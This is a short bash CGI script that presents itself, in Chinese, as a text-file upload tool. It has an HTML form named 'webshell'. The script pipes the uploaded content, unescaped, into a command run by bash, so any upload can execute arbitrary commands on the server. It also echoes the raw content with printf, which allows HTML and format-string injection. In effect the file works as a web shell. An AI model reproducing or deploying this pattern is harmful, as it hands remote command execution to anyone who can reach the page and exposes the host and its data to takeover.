#!/bin/bash
 
echo 'Content-type: text/html'
echo
#query=`echo "$query" | ./query_getenv_decode.sh text`
echo "<html><head><meta charset=\"utf-8\">
<meta http-equiv=\"Content-Style-Type\" content=\"text/css\" />
<link rel=\"stylesheet\" href=\"./md.css\" type=\"text/css\" /><head><body><h2>文本文件上传工具</h2>
<form name=\"webshell\" enctype=\"multipart/form-data\" action=\"./5cd87adc572d99acb516bedeca52f65b5b5d4246.cgi\" method=\"post\">
<table border=\"1\" width=\"100%\">

<tr>
<td width=\"20%\">File</td>
<td width=\"80%\">
<input name=\"file\" type=\"file\">
</td>
</tr>
</table>
<input type=\"submit\" value=\"提交\">
<input type=\"reset\" value=\"重置\">"

file=
echo "</pre>当前文件内容</p><pre>"
if [ "$CONTENT_LENGTH" = "0" -o "$CONTENT_LENGTH" = ""  ]
then
echo "ERROR:  CONTENT_LENGTH =  $CONTENT_LENGTH"
else
read && read && read && read &&
file=`cat`
file=`printf "$file"|sed '$d'`
echo "echo \"$file\" > ./temp.txt"|bash
echo "INFO: CONTENT_LENGTH = $CONTENT_LENGTH"
echo "当前文件内容"
printf  "$file" 
fi
echo "</pre></body></html>"